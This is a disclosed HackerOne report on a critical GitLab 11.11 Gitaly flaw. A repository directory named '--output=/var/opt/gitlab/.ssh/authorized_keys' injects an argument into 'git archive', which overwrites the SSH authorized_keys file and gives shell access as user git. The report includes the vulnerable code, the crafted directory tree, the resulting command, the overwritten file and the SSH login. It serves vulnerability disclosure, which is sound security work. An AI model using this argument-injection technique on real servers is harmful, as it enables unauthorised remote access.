# Local files could be overwritten in GitLab, leading to remote command execution

## Report Details
- **Report ID**: 587854
- **URL**: https://hackerone.com/reports/587854
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-05-22T14:27:06.680Z
- **Disclosed**: 2019-07-17T00:23:37.470Z

## Reporter
- **Username**: saltyyolk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
#### Arbitrary file overwrite
A new feature (download a directory of a repository) in GitLab 11.11 introduced some changes in `./internal/service/repository/archive.go` of Gitaly.
```go
func handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           
        archiveCommand, err := git.Command(ctx, in.GetRepository(), "archive",                          
                "--format="+format, "--prefix="+in.GetPrefix()+"/", in.GetCommitId(), path) 
...
```

A new parameter `path` is concatenated to the command, the parameter is supposed to carry the path of the directory to be downloaded in the repository. However, Gitaly could be misled by an attacker if the path starts with double dashes, for example:
```shell
$ tree
.
└── --output=
    └── var
        └── opt
            └── gitlab
                └── .ssh
                    └── authorized_keys
                        └── id_ed25519.pub
```

Suppose we have a repository which has only one file `id_ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized_keys/`. What happens in Gitaly when I click `download directory as tar` under this directory? The actual command get executed here is:
```
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

The content of the archive gets written to the `/var/opt/gitlab/.ssh/authorized_keys` file instead of transferred to the user.

#### RCE
The reason I choose `tar` as the format is that `tar` doesn't compress the content, all contents in the repository are preserved with some tar headers concatenated into the output.

In the above example:
Content of  `id_ed25519.pub`
```
#
ssh-ed25519 ██████
#
```
Content of  the overwritten `authorized_keys`
```
~/workspace/gitlab/archive$ docker exec -ti e1a bash
root@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys 
pax_global_header00006660000000000000000000000064134712530140014512gustar00rootroot0000000000000052 comment=412e285af38342030e5e30fcba77cb4296fb245d
archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/000077500000000000000000000000001347125301400244635ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/000077500000000000000000000000001347125301400262525ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/000077500000000000000000000000001347125301400270425ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/000077500000000000000000000000001347125301400276445ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/000077500000000000000000000000001347125301400311065ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/000077500000000000000000000000001347125301400317615ustar00rootroot00000000000000authorized_keys/000077500000000000000000000000001347125301400351135ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.sshid_ed25519.pub000066400000000000000000000001661347125301400373000ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/authorized_keys#
ssh-ed25519 ████████ 
#
```

SSH server allows dummy content in the `authorized_keys` file, as long as the public keys are started with a new line.

So, after the exploit:
```
$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami
git
$ 
```

### Steps to reproduce

As stated above.

### Impact

For most self-hosted single instance GitLab users, this is a RCE issue.

For those who has Gitaly running in different OS with gitlab-shell, the impact varies and depends on different circumstances.

For GitLab.com, as the described PoC is destructive and it's hard to observe if I choose some other files to overwrite. I didn't test and I want to leave the evaluation of impact to you guys. :p

#### Results of GitLab environment info
```
root@localhost:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.5.3p105
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	11.11.0
Revision:	3e8ca2fb781
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	9.6.11
URL:		http://10.26.0.3
HTTP Clone URL:	http://10.26.0.3/some-group/some-project.git
SSH Clone URL:	git@10.26.0.3:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	9.1.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

OS command injections usually lead to serious results, remote code execution in this case.

## Attachments
No attachments
